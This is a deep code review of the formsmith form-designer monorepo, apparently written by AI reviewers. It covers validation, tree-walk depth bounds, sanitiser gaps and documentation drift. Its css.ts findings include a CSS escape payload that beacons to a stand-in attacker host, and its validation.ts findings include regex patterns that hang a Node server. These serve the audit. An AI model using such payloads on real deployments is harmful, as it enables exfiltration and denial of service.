# Deep code review — 2026-08-31

**Scope.** Every tracked file in the repository except `docs/reviews/`, `docs/reports/` and `pnpm-lock.yaml`
— 179 files, ~50 000 lines of source and ~9 000 of documentation. The two report directories were held
back deliberately: the request was that this pass not be biased by the previous ones, so no reviewer read
them and no finding here is inherited from them. Reconciling the two is a separate job.

**Method.** Sixteen Opus-5 subagents, each given a disjoint slice and told to read every assigned file in
full rather than sample it. The union of the slices is the tree; every file appears below with its findings
or with "No issues found." Each agent tagged its findings on a five-rung evidence ladder (E1 asserted →
E5 observed) and was forbidden from reporting above MEDIUM on E1 or E2. The lead then re-read the anchor
lines for every HIGH that carries weight and for the most consequential MEDIUMs, and annotated the results.
Nothing here was applied to the code; this is an assessment.

---

## Executive summary

**No committed secrets, credentials or personal data were found.** No fixture, config, or checked-in JSON
holds anything that needs rotating. That was the first thing every slice looked for, and it is clean.

There are also no CRITICALs. Nothing here is remotely exploitable by an anonymous attacker against a
deployed formsmith. What the review found instead is a consistent, specific failure shape, and it is worth
naming plainly because it recurs in eleven different places: **a guard, a comment, or a test that describes
a protection more completely than the code provides it.** In a codebase this heavily and this carefully
commented — where nearly every non-obvious line carries a paragraph explaining the incident it came from —
the comment *is* the specification a reader trusts. Nine of the confirmed findings below are cases where
that trust is misplaced.

The three findings that matter most all end the same way: a form reports success while the data is wrong
or missing.

1. **`docs/spec/08-validation.md`'s "Server parity" section is marked Status: built and teaches a server
   integration that silently accepts invalid submissions.** It says the demo server exists "to prove that
   `validateForm` is the same function in both places" and gives a snippet built on `validateForm`. The
   demo server does not import `validateForm` — it uses `validateAcross` and `submittedAcross`, per-scope.
   A host that copies the documented snippet onto a wizard document gets `{}` back for a submission
   missing every required answer, because every `Step` is hidden by a context the snippet never builds.
   The same false claim also sits in a code comment at `apps/demo-server/src/index.ts:414`.
2. **`KeyField` in the Properties panel edits the previously selected component.** It has neither a React
   `key` nor a re-sync guard, and the comment justifying that says "the panel above already remounts on
   that" — nothing does. Selecting a second component leaves the old key in the box; if the first
   component has since been deleted, committing renames the *current* one to it, taking its submitted
   payload key with it.
3. **`validateForm` is the only walk in `@formsmith/core` with no depth bound**, on the one path that runs
   server-side against untrusted input — and `submittedData` beside it carries the bound and a comment
   claiming `validateForm` already refuses.

### Severity tally

| Severity | Count |
|---|---|
| CRITICAL | 0 |
| HIGH | 43 |
| MEDIUM | 129 |
| LOW | 144 |
| NOTE | 100 |
| **Total** | **416** across 179 files |

Every HIGH rests on E3 or better; none sits at E1 or E2. Evidence distribution: E1 × 1, E2 × 78,
E3 × 111, E4 × 175, E5 × 32.

### Cross-cutting themes

The same root cause reached from many files is the highest-signal thing a review like this produces. These
eight are ordered by how much of the report they explain.

**1. The submit path is the least-guarded path in core.** `validateForm` has no depth bound while every
sibling walker does; it and `submittedData` iterate `children` with no `Array.isArray` check; `applyRule`
dereferences a rule before checking it is one; and `minLength`, `maxLength`, `min` and `max` silently
*pass* when the rule's `value` is missing, while the `pattern` case one line below got an explicit guard
for the identical paste. Every one of those failures lands on a server, on a submission, and four
independent slices reached it.

**2. Core's walkers were hardened one at a time, and the table meant to catch that is missing a row.**
`walk` is total and depth-bounded and its comment calls it "the walk every other module borrows"; `flatten`,
`objectFor`'s `visit`, `validateForm`'s `visit`, and `findNode`/`updateNode`/`removeNode` are none of those
things. `depth.test.ts` exists to enumerate every bounded walker and states its own completeness rule —
"a row that is not added is a hole somebody can see" — and the walker on the submit path is not in it.
`schema.ts` is worse than unbounded: it *has* the bound and defeats it, recursing as `visit(child)` with
depth resetting to zero on the schema-carrying branch.

**3. A host's document is warned about, never refused — so core's totality guards are load-bearing for the
designer, and the panels that would repair a broken document are the ones that throw on it.**
`store.ts:333-341` deliberately only `console.warn`s an invalid `initialDocument`, arguing that "a library
that will not open a host's own saved document is worse than one that opens it and says what is wrong."
That is a good decision, but it makes six render paths load-bearing that are not written as though they
are: `FormSettings` on a non-array `languages`, `Rules` on `validations: [null]`, `DocumentDialog` on a
non-string `name`, `Tree` via `flatten`, `Palette`/`Properties` via `indexKit`, and `styleSheetFor` on a
numeric `key`. React 19 unmounts the tree on a render throw, so in each case the whole builder disappears —
including the JSON dialog that was the repair route.

**4. The kit conformance suite tests how a kit *draws* and never that it *collects*.** `test/kit-contract.test.tsx`
is 1551 lines and imports `fireEvent` once, using it once, for a radio click; 18 renders pass
`onChange={() => undefined}`. A kit that draws every control, wires every label and ARIA attribute,
announces its errors, and drops every keystroke passes the whole suite bar one rule. This is the file that
makes "a kit is a package, not a rewrite" true or false. Two more of its rules are structurally unable to
fail: the variant test compares two `outerHTML` strings that always differ on a `useId`-derived
`data-fs-scope`, and three separate rules are each built so they cannot see a kit's `defaultProps` — which
is why the MUI kit has shipped an 8× wrong default gap on four components without anything going red.

**5. Several build-failing guards record the wrong signal, so they cannot fail for the reason they exist.**
`test/eslint.config.test.ts` records `message.ruleId` and discards `severity`, and `pnpm lint` is
`eslint .` with no `--max-warnings` — so invariants 1 and 2 could be downgraded from `error` to `warn` and
both the guard and CI would stay green. `test/count-reporter.ts` writes its liveness marker in `onInit`
rather than in a finish hook, so a reporter that implements neither finish hook still proves itself alive.
`designer.css.test.ts` names the form's scopes as two literal strings and misses `.fs-body`, a real wrapper
between `.fs-shell` and the canvas — `.fs-body input { … }`, the exact rule that broke MUI's notched
outline, passes it. `test/setup.ts` exports an observer-leak counter nothing reads. `test/readme.test.ts`
enumerates `packages/*` and so cannot see the root README, whose runtime example is precisely what the
`applyChange` rule forbids.

**6. The inspector is safe by eight independent re-sync guards rather than by one key.** No panel is keyed
on the selection, so every editor is reconciled in place across a selection change. Eight editors carry
their own `if (value !== committed)` block and several more are keyed per node at their call site;
`KeyField` is the one that is neither, and a ninth editor added without one inherits the same bug silently.

**7. Comments that describe a fix the code does not implement.** Beyond the three in the headline:
`Canvas.tsx` carries a block comment describing a bounds check the function does not have (and an outer
docblock saying so, contradicting it); `store.ts:550` says a rename repoints "the key and anything that
names it" when it repoints only the node's own `renderWhen`; `kit-mui` says a `RadioItem` is "deliberately
not wired to the group's value" when MUI's context wires it, which is plausibly why the empty-value guard
was never added there; `types.ts` claims a `readonly` index signature makes a misuse a type error, which
TypeScript does not do.

**8. Documentation figures drift wherever the guard's regex does not reach.** Nine versus eleven axe states
in three documents (and inside `docs/accessibility.md` itself, twice); 911 versus 1967 unit tests; "about
forty" `fs-` classes against 102; and — the one with real consequences — `docs/spec/12-api.md` publishing
`RESERVED_KEYS` as three names when the exported constant has thirteen, including `toString`, whose
omission the code's own docblock ties to "a form with a missing required answer submitting clean."

---

## Verification note

The lead re-read the anchor lines for 31 findings: every HIGH whose consequence is data loss, a silent
pass, or an unenforced invariant, plus the MEDIUMs that several slices converged on. Verdicts:

| Verdict | Count |
|---|---|
| CONFIRMED | 29 |
| DOWNGRADED | 1 |
| REFUTED | 0 |
| BLOCKED | 1 |

**Confirmed against source** (file and line read, mechanism traced): the `FORBIDDEN` backslash bypass and
the trailing-backslash stylesheet break in `css.ts`; `KeyField`'s missing key and the unkeyed
`Inspector`/`Properties` render chain; `setProp`'s undo-label collision against `commit`'s replace-on-same-label;
`renameKey` against `repointBinding`'s literals-only rewrite; `flatten`'s missing guards against `walk`'s;
`inferAxis`'s single axis against both kits' wrapping `Grid`; `.fsh-field__error`/`__hint` used in
`kit-html/src/renderers.tsx` and declared in no stylesheet; `validateForm`'s `visit` signature against
`submittedData`'s; `optionEntry`/`optionValue` producing a duplicate `'0'` for a mixed option list;
`schema.ts:379`'s depth reset; the `gap: 2` versus `gap: 16` defaults across the two kits and `px()`'s
effect on them; `kit-mui`'s `RadioItem` against `kit-html`'s empty-value guard; the renderer's `computed`
branch omitting `options.row` where its `condition` neighbour passes it; `insideTheForm`'s two literal
scope names against `Designer.tsx:275`'s `.fs-body`; `keyboard.ts:145`'s key match; `kit-contract`'s single
`fireEvent` and 18 no-op `onChange`s; `observerCount`'s zero consumers; the `outerHTML` comparison against
`useId`-derived scopes; `designer.css`'s `(0,1,1)` panel rules against the `(0,1,0)` rules they beat;
`apps/demo-server`'s import block with no `validateForm`; `RESERVED_KEYS`' thirteen members against the
spec's three; `eslint.config.test.ts`'s `ruleId`-only mapping against `"lint": "eslint ."`; `count-reporter`'s
marker written at `:147` inside `onInit`; `READMES` built from `readdirSync(at('packages'))` against
`README.md:95`; `react-hooks`' three warn-severity rules spread unmodified; the `ImportExpression[source.value=…]`
selector against a template-literal specifier; and `check-dist.mjs` mentioning `exports` only in a comment.

One confirmation rests on a language rule rather than a file read, and is labelled as such in place:
`types.ts:248-259` — TypeScript does not factor `readonly` into object assignability, so the comment's
claim of compiler enforcement is wrong. The mechanism is certain; no file in `node_modules` was opened for it.

**DOWNGRADED — `Canvas.tsx:483-523`, HIGH → MEDIUM.** The claim that `resolveRelease` has no bounds check
is correct and I read the function to confirm it. But the outer docblock says the check was removed
deliberately, because an earlier version of it broke legitimate drops onto a scrolled form. That makes this
an accepted trade-off with a known downside rather than an oversight, and the defect actually worth fixing
is the contradictory dead comment block still describing the removed check as present. A correct guard
clamps to the scrollable content box, not the client box.

**BLOCKED — `dnd.ts:272-276`, reported MEDIUM, left at that severity flagged UNVERIFIED.** The mechanism is
confirmed: `documentIndex` returns the raw filtered slot for a same-parent move, and slot and document
index diverge whenever a sibling drew no element. What I did not finish is the second half of the claim —
that `dnd.test.ts:302` pins a *wrong* value for that fixture. Settling it means working the `withHidden()`
fixture's indices through `removeNode` then `insertNode` by hand. I stopped rather than write CONFIRMED
for something I had reasoned about but not computed.

**Nothing was refuted.** That is unusual enough to state plainly rather than let it read as thoroughness:
it means this pass did not act as much of a filter, and the reason is that the slices were unusually
disciplined about the evidence ladder — 42 of the 43 HIGHs arrived at E4 or E5 with the failing line
already quoted. The findings I did *not* re-read are reported at the agents' own tags, and an E2 or E3
LOW here has had exactly one pair of eyes on it.

---

# Per-file findings

---

# Area A — `packages/core`, the document model

## packages/core/src/tree.ts

- **[HIGH]** **[E4]** **(Verified.)** `tree.ts:114-127` — `flatten` is neither depth-bounded nor total against a malformed `children`, unlike `walk` immediately above it, and it runs inside a React render body on a host-supplied document the designer deliberately does not refuse. Evidence: line 123 is `node.children?.forEach(...)` — `?.` only guards nullish, so a truthy non-array (`children: {}`, `children: 5`, `children: "ab"`) reaches `.forEach`, which is `undefined` on all three; and `visit` recurses with no `MAX_TREE_DEPTH` check, unlike `walk` at line 43 whose comment claims to be "the walk every other module borrows". `store.ts:333-341` runs `validateDocument(initial)` in a `useEffect` and only `console.warn`s, so an invalid host document is rendered. `Tree.tsx:345` calls `flatten(root)` in the component body and `:180` in a key handler. Failure scenario: a host restores a document in which one node's `children` round-tripped as an object map (`{"0": {...}}`) — a shape `validateDocument` reports as malformed and the store declines to block — the structure panel throws during render, and a throw during render in React 19 unmounts the whole designer, so the panel that exists to repair the document is the one place it cannot be opened. Also on the public API surface via `autoValidateKeys` (`validation.ts:749`).
- **[MEDIUM]** **[E4]** `tree.ts:64-94, 430, 475, 376` — the whole mutation/lookup family shares `flatten`'s gap. `findNode:66` and `pathTo:87` use `for (const child of root.children ?? [])`, so `children: {}` throws `TypeError: root.children is not iterable`; `updateNode:430` calls `root.children.map` after only `if (!root.children) return root`, so `children: 5` throws; `removeNode:475` and `duplicateNode`'s `copy` at `:376` have the same shape. None carries `MAX_TREE_DEPTH`. Failure scenario: on the same unvalidated host document, every store callback throws out of an event handler on the first edit. The server-side path is unaffected — `validateForm` has its own walk (which has its own, worse, problem; see below).
- **[LOW]** **[E4]** `tree.ts:188-198, 322` — `duplicateNode` can return a copy that keeps its source's key, because `findNode` is unbounded while the `taken` set it is checked against is not. `taken = new Set(collectKeys(root))` and `collectKeys` goes through `walk`, which stops past `MAX_TREE_DEPTH`; `findNode` locates nodes past depth 500 that are absent from `taken`, so `copyKey`'s `if (base === key && !taken.has(base)) return base` fires and hands back the original key. Failure scenario: duplicating a node nested past 500 levels produces two nodes sharing a key, which makes every later `updateNode`/`removeNode` edit only the first match.
- **[LOW]** **[E4]** `tree.ts:188-198` — `copyKey` is not bounded by `MAX_KEY_LENGTH` while `generateKey` is (`tree.ts:152` → `keys.ts:104`, which rejects anything over 128 characters). Duplicating a component with a 128-character key mints a 129-character key, producing a document the same package's `validateDocument` reports as `invalid-key`.
- **[LOW]** **[E4]** `tree.ts:511-524` vs `442-464` — the "a leaf must not be given children" guard was added to `moveNode` only. `moveNode:524` has `if (!Array.isArray(parent.children)) return root` and its comment argues the hazard was "unreachable from the UI and reachable from the API, which is the worse of the two places to leave it"; `insertNode:449` unconditionally does `[...(parent.children ?? [])]`. A host calling `insertNode(root, someTextFieldKey, node)` gets a text field with a field inside it — no renderer draws it, while `validateForm` and `toJsonSchema` keep walking it.
- **[LOW]** **[E3]** `tree.ts:430-436` — `updateNode` walks every non-matching subtree twice: `findNode(child, key)` scans it, then `updateNode(child, …)` is called unconditionally and scans it again. O(n·depth) rather than O(n), on a path every controlled prop editor hits per keystroke.
- **[LOW]** **[E4]** `tree.ts:42-47, 129-133` — `walk`'s totality guard is `typeof n !== 'object'`, and `typeof [] === 'object'`, so for `children: [[]]` the inner array is passed to `fn` as a node and `collectKeys` pushes `undefined` into a declared `string[]`. Harmless today because both consumers only test string membership; the exported type lies.
- **[NOTE]** **[E2]** `tree.ts:895-931` — the `dataKey` and `events` checks still sit inside the `else` of the key check, which is the layering the comment at `:933-944` says was fixed. A node with `key: 42` reports one error, and fixing the key produces a second round about its data key — the outcome the hoist was done to eliminate.
- **[NOTE]** **[E4]** `tree.ts:780-795` — the gate is more permissive than the type it gates: `settings` and `actions` are accepted when `undefined`, while `FormDocument` (`types.ts:205, 211`) declares both required. Drift rather than a live bug; nothing reads either unguarded today.
- **[NOTE]** **[E2]** `tree.ts:772, 905, 995, 1238, 1260, 1323` — `validateDocument` is documented as "Total by design … never throws", but every one of these builds its message with `JSON.stringify` over a value from the document, and `JSON.stringify` throws on a cyclic object or a `BigInt`. Unreachable for a document that came from `JSON.parse`; reachable for a host that hands over a runtime object, which the `FormDocument` signature invites.

## packages/core/src/types.ts

- **[MEDIUM]** **[E4]** **(Verified — by language semantics, not a file read; see the verification note.)** `types.ts:248-259` — the comment claims a compiler-enforced protection TypeScript does not provide: "Readonly makes the direction that matters a type error: a context cannot be handed to something that wants data." TypeScript does not factor `readonly` into object assignability, so `{ readonly [x: string]: JsonValue }` is assignable to `{ [x: string]: JsonValue }`. Failure scenario: the exact mistake the comment says is now caught — passing a context where `FormData` is wanted in `validateForm` (`validation.ts:630-634`) — still compiles clean, the form validates against the host's own facts, and answers are treated as context. A wrong claim of enforcement is worse than no claim, because it stops anyone adding the brand that would work.
- **[NOTE]** **[E2]** `types.ts:131-134` — `FieldSchema.validations`' JSDoc says "Read it with `validationsOf`", and that comment ships in the published `.d.ts`, but `validationsOf` is not re-exported from the package entry. See the `index.ts` finding.

## packages/core/src/rows.ts

- **[MEDIUM]** **[E4]** `rows.ts:223` — `keyScopesFor` does not take the first match, despite the comment at `:205-215` claiming it does and citing `findNode`/`findParent`/`pathTo` for the rule. The guard is `if (node.key === nodeKey && enclosing && row === undefined)`: when the first node in document order carrying `nodeKey` is not inside a repeater, `enclosing` is `undefined`, the assignment is skipped, and a later duplicate that *is* inside a repeater sets `row`. What the function takes is the first match with an enclosing repeater. Failure scenario: two nodes keyed `x`, the first at form level and the second inside a repeater. `findNode` resolves `x` to the form-level node, the Properties panel and Style tab offer a row scope for it, the author picks `scope: 'row'` on a node in no row, the read is `undefined`, the condition is false, the component is hidden and never validated.
- **[LOW]** **[E4]** `rows.ts:459-461` — `isRowScopeNode` is a second, differing definition of the predicate `isRowScope` already exports from `validation.ts:727`. This one is `node?.schema?.type === 'array' && Array.isArray(node.children)`; the other is `node.schema?.type === 'array' && node.children !== undefined`. They disagree for any truthy non-array `children`, so `validateForm` treats such a node as a repeater and expects an array while `rowScopeProblems` and `keyScopesFor` do not. `tree.ts:517-523` compounds it by writing `Array.isArray(parent.children)` under a comment saying it is asked "the way `isRowScope` asks", which is not what `isRowScope` asks.
- **[LOW]** **[E4]** `rows.ts:308-315` — `formKeys` is documented as "Only the form-level answers" but excludes a top-level repeater's own data key, while `rowKeys` at `:291` deliberately does count a nested repeater's key. The third mismatch check at `:436` therefore never fires for a `scope: 'row'` ref naming a top-level repeater's own list — a read that resolves to nothing and hides the component, reported for every other form-level key but not this one.
- **[LOW]** **[E2]** `rows.ts:260` — `MAX_TREE_DEPTH = 500` is re-declared rather than imported from `tree.ts:742`, in a file that already imports values from `tree.ts` and whose own comment says the bound is "the same number" as the gate's. `context.ts`, `schema.ts` and `validation.ts` all import it; this file is the outlier.
- **[NOTE]** **[E2]** `rows.ts:349-380, 389-410, 426-449` — three near-identical blocks each recompute `props` and `guards` and re-iterate the same list; blocks one and three run under the same condition and differ only in the scope and the membership test. This is the "two functions identical apart from one predicate" shape `refsAtScope`'s own comment says was collapsed into one function for exactly this reason.
- **[NOTE]** **[E2]** `rows.ts:125-127, 143-147` — `rowsOf` returns the caller's array by reference and `rowContext` returns the caller's object as `values`, so `rowsOf(data.addresses).push(x)` mutates the host's `FormData` from inside a package whose contract is that nothing here mutates. `rowKeys`' `gather` at `:278` also lacks the `typeof inner !== 'object'` guard its twin at `:184` has.

## packages/core/src/factory.ts

- **[LOW]** **[E4]** `factory.ts:87` — `instantiate` hardens two of the three things it reads off a third-party `ComponentDef` and leaves the third. `defaultProps` is shape-checked (`:77-82`) and `defaultRenderWhen` is wrapped in `try` (`:104-111`), both with comments about a kit "compiled loosely or built at runtime from JSON"; `def.type` is passed straight to `generateKey`, whose first statement is `type.charAt(0).toLowerCase()`. A kit built from JSON with a missing `type` throws inside the designer's drop handler.
- **[NOTE]** **[E1]** `factory.ts:38` — `createDocument(name: string, id: string)` takes its two strings in the opposite order to `FormDocument`'s own field order and to every other id-first API here. A transposed call compiles and produces a document whose id is its title, which no gate reports since both are non-empty strings.

## packages/core/src/keys.ts

No issues found.

## packages/core/src/kit.ts

- **[LOW]** **[E4]** `kit.ts:152, 181` — `indexKit` and `groupKit` iterate `kit.components` with no guard, in the same "a kit is third-party code by design" seam `factory.ts` explicitly hardened. `for (const component of kit.components)` throws for a kit whose `components` is absent or is an object. `groupKit` runs inside a `useMemo` in `Palette.tsx:51` and `indexKit` in the render bodies of `Properties.tsx:36` and `StyleTab.tsx:72`, so the throw is a render throw and React 19 unmounts the whole designer rather than showing an empty palette.

## packages/core/src/index.ts

- **[LOW]** **[E3]** `index.ts:63, 88-105` — three exports the package's own shipped documentation implies are public are missing from the entry point: `validationsOf` (named as the prescribed reader in `FieldSchema`'s JSDoc, which reaches consumers via `dist/types.d.ts`), `MAX_TREE_DEPTH` (while its sibling `MAX_CONDITION_DEPTH` is exported), and `MAX_KEY_LENGTH` (while `KEY_PATTERN` and `RESERVED_KEYS` are exported alongside it). A server-side consumer following the type's own instruction gets a resolution error and hand-rolls the guard the helper exists to centralise.

## packages/core/src/exhaustive.ts

No issues found.

## packages/core/package.json

- **[LOW]** **[E5]** `packages/core/package.json:5, 15-21` — `"license": "MIT"` is declared but there is no `LICENSE` file in `packages/core` and none is named in `files`; the only `LICENSE` is at the repo root, which npm does not pull into a workspace package's tarball. The published tarball for a package whose whole premise is "the designer is MIT" ships no licence text, and downstream licence scanners flag exactly this.
- **[NOTE]** **[E2]** `packages/core/package.json:9-14` — no `"./package.json"` subpath in `exports`, which several resolvers read.

## packages/core/tsconfig.json

- **[NOTE]** **[E4]** `packages/core/tsconfig.json:10` — `"exclude": ["src/**/*.test.ts"]` and `package.json`'s `files` negations disagree by one pattern (`*.test.tsx`). See the `tsconfig.eslint.json` and `CLAUDE.md` findings in Area I, where this has a real consequence.

## packages/core/README.md

- **[NOTE]** **[E3]** `packages/core/README.md:13-21` — the quickstart is the server-side use case and omits the gate the repo's own reference server puts in front of it (`apps/demo-server/src/index.ts:351` runs `validateDocument(doc)` and answers 422 first). `validateDocument` is not mentioned in "What is in here" either, and it is the function most of this package's comments are written about.
- **[NOTE]** **[E2]** `packages/core/README.md:9-11` — `npm install @formsmith/core` against `"version": "0.0.0"`; the package has never been published, so the first command a reader runs cannot work.

## packages/core/src/validation.ts

- **[HIGH]** **[E4]** **(Verified. Converged: three slices.)** `validation.ts:644` — `validateForm`'s `visit` is the only tree walk in the package with no depth bound, and `submittedData`'s docblock states the opposite. `visit` (644–714) is declared `(node: ComponentNode, scope: EvalOptions)` with no `depth` parameter, while `walk` (`tree.ts:43`), `contextKeys` (`context.ts:96`), `objectFor` (`schema.ts:328`), `keyScopesFor` (`rows.ts:221`) and `submittedData` itself (`validation.ts:808`) all check `depth > MAX_TREE_DEPTH`; the comment at `806-808` claims "the row cap and the tree bound are the two `validateForm` already refuses on", which is false. Failure scenario: a stored document nested a few thousand deep — nothing on the validate path calls `validateDocument`, as `validateAcross`'s own comment at `:947` says — makes `validateForm` throw `RangeError` on every submit, i.e. the unhandled 500 the file's comments repeatedly cite as the failure to avoid. This is the least guarded walk in the package and it is the one on the submit path.
- **[MEDIUM]** **[E4]** `validation.ts:713` — `validateForm` and `submittedData` throw on a malformed `children`, the exact shape `walk` was hardened against. `for (const child of node.children ?? [])` at 708, 713, 844 and 855 — `children: 5` yields `5`, which is not iterable; a `children: [null]` entry reaches `isVisible(node…)` at 645, which dereferences `node.renderWhen` with no node guard. `tree.ts:43-45` guards both cases with a comment naming the same incident.
- **[MEDIUM]** **[E4]** `validation.ts:477` — `applyRule` dereferences the rule before checking it is one, so `"validations": [null]` throws `TypeError` out of `validateForm`, on the server, per submit. `validationsOf` (`tree.ts:559-562`) only checks that the array is an array; `isRequired` at `:603` and `context.ts:108` both use `rule?.`, so nullish entries are known to be reachable.
- **[MEDIUM]** **[E4]** `validation.ts:504` — `minLength`, `maxLength`, `min` and `max` silently **pass** when the rule's `value` is missing or non-numeric, the permissive direction this file hardens against everywhere else. `lengthOf(value) < rule.value` and `held < rule.value` are `false` whenever `rule.value` is `undefined`; the `pattern` case immediately below got an explicit `if (typeof rule.value !== 'string') return fail()` with a comment explaining that a valueless rule "reaches here from a paste". The same paste reaches these four. Failure scenario: a document holding `{"key":"min"}` leaves the field unconstrained on the server while the Rules tab still lists the rule.
- **[MEDIUM]** **[E4]** `validation.ts:263` — `nestedUnbounded` misses nested unbounded quantifiers wrapped in a plain group, so `(?:(a+))+` and `((a+))+` compile and run. The `unbounded` flag is propagated to the enclosing group only when the inner group is itself quantified; an unquantified `)` pops the group and discards its flag. Traced on `(?:(a+))+`: returns `false`. Failure scenario: an author writes `^(?:(a+))+$` — a one-token rewrite of the shape the docblock says is refused — and a 40-character submitted value hangs the Node event loop for the whole process.
- **[MEDIUM]** **[E3]** `validation.ts:218` — the ReDoS guard is purely structural, so alternation-based catastrophic patterns are accepted and the 4096-character input cap does not bound them. `nestedUnbounded` never inspects `|`. Acknowledged in the docblock and in `docs/spec/08-validation.md`, but the deployment consequence is not: form authors and deployers are different people per `css.ts:5-9`. `pattern: "^(a|a)+$"` plus ~35 characters wedges the server thread.
- **[LOW]** **[E4]** `validation.ts:670` — `NOT_A_LIST` overwrites the repeater's own rule failure, the mistake the `TOO_MANY_ROWS` branch twenty lines below was fixed for (it guards with `if (!Object.hasOwn(errors, at))` and explains that clobbering "los[es] the message a person can act on").
- **[LOW]** **[E4]** `validation.ts:749` — `autoValidateKeys` walks with `flatten`, which `context.ts:86-91` deliberately avoided for being neither total nor bounded, saying so in as many words.
- **[LOW]** **[E2]** `validation.ts:718` — `validateForm` and `validateAcross` return null-prototype objects to callers, while `submittedData`/`submittedAcross` deliberately spread back to a plain object "so a host does not receive something surprising back from a function it will hand straight to `JSON.stringify`". A host calling `errors.hasOwnProperty(key)` throws; the asymmetry is undocumented.
- **[LOW]** **[E4]** `validation.ts:327` — `matchesPattern` re-runs the full pattern analysis and recompiles the `RegExp` for every value. A repeater at the 5000-row cap with a patterned field does 10 000 regex compilations and 5000 source scans per submit.
- **[NOTE]** **[E2]** `validation.ts:130` — two stacked JSDoc blocks, so only the second attaches and `matchesPattern` remains undocumented in the emitted `.d.ts`. The comments at `:87-89` and `:386-392` apologise for exactly this pattern in this file.

## packages/core/src/condition.ts

- **[LOW]** **[E4]** `condition.ts:25` — past the depth bound `same` returns `false`, which makes `ne` and `notIn` return `true` — the outcome the comment claims the choice avoids. The `a === b` identity shortcut sits after the bound check, so even two references to the same object compare unequal there.
- **[LOW]** **[E4]** `condition.ts:233` — the four ordering operators answer `false` (not "unreadable") when the operands are incomparable, so `not(gt(x, y))` shows a component whose comparison could not be made. The `in`/`notIn` branch at `:274` was explicitly changed from `false` to `undefined` because that exact shape was a bug; the ordering branch was not. Failure scenario: `renderWhen: not(gte(answer, 5))` where the answer arrives as the string `"5"` shows the component on the strength of a comparison that never happened.

## packages/core/src/visibility.ts

- **[LOW]** **[E4]** `visibility.ts:60` — `isVisible` dereferences `node` without the totality guard every other document walker in the package carries, and it is the first thing `validateForm`'s walk calls (`validation.ts:645`), on a walk that does not filter its children either. `"children": [null]` throws during both render and server-side validation.

## packages/core/src/context.ts

- **[LOW]** **[E4]** `context.ts:40` — `MAX_CONDITION_DEPTH` is redeclared here instead of imported, which is the drift `condition.ts:62-68` exported it to prevent ("One number, imported, rather than a second one that agrees today"). `tree.ts` and `rows.ts` import it.
- **[LOW]** **[E4]** `context.ts:258` — `contextValues` truncates at `MAX_CONTEXT_VALUES` with no signal to the caller, on the permissive side. `rows.ts:326-345` shows the pattern this package uses when a walk stops short — a `truncated` flag plus a reported problem, because "a check that reports problems must never answer 'no problem' when what happened was 'did not look'". Failure scenario: a document comparing `context.step` against more than 1000 distinct literals yields a partial step list, and `validateAcross` never runs a pass for the steps beyond the cap — their required fields are never checked, on the server.

## packages/core/src/language.ts

- **[LOW]** **[E4]** `language.ts:26` — `languageTag` uses truthiness on `dialect` while the gate's deliberate copy (`tree.ts:1340-1343`) requires a string, and `validateDocument` never reports a non-string `dialect`. `{"code":"en","dialect":5}` validates clean while `findLanguage` compares against `en-5`, so the document names a language it does not have and every translation renders as its raw key. The docblock records that this copy has already drifted once.

## packages/core/src/schema.ts

- **[MEDIUM]** **[E4]** **(Verified. Converged: two slices.)** `schema.ts:379` — the depth bound in `objectFor` is defeated: the child recursion for a data-bound node omits `depth + 1` (line 334 recurses as `visit(child, depth + 1)`, line 379 as `visit(child)` with `depth = 0`), and the nested-repeater recursion restarts the counter entirely by re-entering `objectFor` at `:371`. The bound's own comment says an export "runs on a document a host may never have gated, and a `RangeError` out of it is a 500 on a route whose whole job is to hand over a schema". Unlike `MAX_TREE_DEPTH`'s 500, there is no effective ceiling at all on either schema-carrying path.
- **[MEDIUM]** **[E4]** `schema.ts:334` — `objectFor` re-implements the tree walk without the totality guards `walk` has: `for (const child of node.children ?? [])` throws for `children: 5`, and a `null` child throws at `node.schema`. `unexportableRules` in the same file borrows the hardened `walk`, so two exports of one module disagree about the same document. Failure scenario: the JSON dialog's schema tab — "the one place somebody is looking at a broken document on purpose", per the comment at `:222-226` — throws while rendering that broken document.
- **[LOW]** **[E4]** `schema.ts:262` — `toJsonSchema` throws on a document with no `root`: `isRowScope(document.root)` calls `node.schema?.type`, and the optional chain protects `schema`, not `node`. Every other entry point in the package is total on a rootless document.
- **[LOW]** **[E4]** `schema.ts:198` — `min`/`max` are exported onto any property type while `minLength`/`maxLength` are refused on non-measurable ones. `minimum`/`maximum` are JSON Schema keywords for numbers only, so a `min` rule on a `string` or `date` field exports a keyword every validator ignores, and `unexportableRules` reports the export as lossless — the same silent-permissive direction the `minLength` guard exists for, on the other axis.
- **[NOTE]** **[E2]** `schema.ts:117` — `validationsOf(node)` is called twice per node inside the walk a comment introduces as a consolidation from three walks into one.
- **[NOTE]** **[E2]** `schema.ts:272` — `properties: { ...{ [name]: rows } }` is a redundant spread that protects nothing and reads as though it does; a computed key in an object literal already uses `CreateDataProperty`.

## packages/core/src/json.ts

- **[LOW]** **[E4]** `json.ts:45` — `optionValue` and `optionEntry` read option fields with plain lookups where the rest of the package reads own properties (`valueOf` at `:228`, `readPath` at `:267`, `schema.ts:241-243`, whose comment names "an application that has polluted `Object.prototype.label`" as the case being defended against). With `Object.prototype.value` polluted, valueless options resolve to the inherited value and the control's submitted value stops being the inverse of what it rendered.
- **[NOTE]** **[E2]** `json.ts:45` — `?? undefined` on a property read is a no-op that additionally maps an explicit `null` to `undefined`, indistinguishable from "no declared value" one line later.

## packages/core/src/css.ts

- **[HIGH]** **[E4]** **(Verified.)** `css.ts:71` — `FORBIDDEN = /[{}<@]|\/\*|\*\//` does not treat the backslash as significant, so the `FETCHING` check on a raw declaration block is bypassable with a CSS escape and author CSS can fetch from the page again. `safeDeclarations` (107–132) applies only `FORBIDDEN`, `quotesBalanced` and `FETCHING = /(url|image-set|element|cross-fade)\s*\(/i` (`:167`) — all three confirmed by reading the file. The escape technique is documented in this same file at `:145-147`, where `FORBIDDEN_VALUE` adds `\\` "because a backslash is how `url(` is written as `\75 rl(` without the letters ever appearing". CSS consumes escapes while building an ident, so `\75 rl(` tokenises as the `url(` function. Failure scenario: a Style tab block of `background:\75 rl(https://attacker.example/beacon)` passes `safeDeclarations`, reaches the page through `<style>` (`renderer/src/index.tsx:809`), and issues a request from the form that is collecting answers — the exfiltration channel the comment at `:120-130` says was closed.
- **[MEDIUM]** **[E3]** **(Verified.)** `css.ts:118` — same root cause, second consequence: `quotesBalanced` skips the character after a backslash, so `color:red\` passes, and `styleSheetFor` emits `…{color:red\}` where `\}` is a valid escape inside the value token and the block is never closed. One component with a trailing backslash silently deletes every rule emitted after it and absorbs the following components' declarations — exactly the breakage `quotesBalanced` was added for, by the route the fix did not look at.
